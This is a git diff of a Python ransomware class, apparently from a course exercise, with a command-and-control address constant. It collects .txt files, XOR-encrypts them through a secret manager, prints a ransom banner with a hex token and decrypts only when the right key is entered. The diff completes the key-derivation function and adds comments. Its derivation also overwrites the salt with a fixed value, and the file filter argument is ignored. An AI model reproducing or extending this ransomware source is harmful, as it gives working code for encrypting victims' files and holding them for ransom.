@@ -15,6 +15,11 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
+KEY_PATH = "/root/key"
+SALT_PATH = "/root/salt"
+ITERATIONS = 48000
+KEY_LENGTH = 16
+
 
 ENCRYPT_MESSAGE = """
   _____                                                                                           
@@ -44,48 +49,43 @@ class Ransomware:
     def get_files(self, filter:str)->list:
         # return all files matching the filter
         files=[]
+        # add all files in the current directory
         for file in os.listdir():
             if file.endswith(".txt"):
                 files.append(file)
         return files
-        #raise NotImplemented()
 
     def do_derivation(self,salt:bytes, key:bytes):
         # derive a key from the salt and the key
         salt = bytes("16", "utf8")
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
-            length=32,
+            length=KEY_LENGTH,
             salt=salt,
-            iterations=100000,
+            iterations=ITERATIONS
         )
-        key = kdf.derive(key)
-
-        #raise NotImplemented()
-
-    def create(self):
-        # main function for creating the ransomware (see PDF)
-        return ()
+        key = kdf.derive(key) # derive the key
+        return key
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        files = self.get_files(".txt")
-        secretM = SecretManager()
-        secretM.setup()
-        secretM.xorfiles(files)
+        files = self.get_files(".txt") # get all files
+        secret_manager = SecretManager()
+        secret_manager.setup() # setup the secret manager
+        secret_manager.xorfiles(files) # encrypt the files
         #print a message with the token with hex format
-        print(ENCRYPT_MESSAGE.format(token=secretM.get_token().hex()))
+        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token())) 
 
     def decrypt(self):
         # main function for decrypting
-        key = base64.b64decode(input("Enter the key: "))
-        secretM = SecretManager()
-        if (secretM.check_key(key)):
-            secretM.set_key(key)
-            secretM.xorfiles(self.get_files(".txt"))
-            secretM.clean()
+        key = base64.b64decode(input("Enter the key: ")) # get the key from the user
+        secret_manager = SecretManager()
+        if (secret_manager.check_key(key)): #check if the key is correct
+            secret_manager.set_key(key)
+            secret_manager.xorfiles(self.get_files(".txt")) # decrypt the files
+            secret_manager.clean() # clean the secret manager
             print("Everything is ok , the files have been decrypted")
-            sys.exit(0)
+            sys.exit(0) # exit with success
         else:
             print("Error: Wrong key")
             # ask for the key again
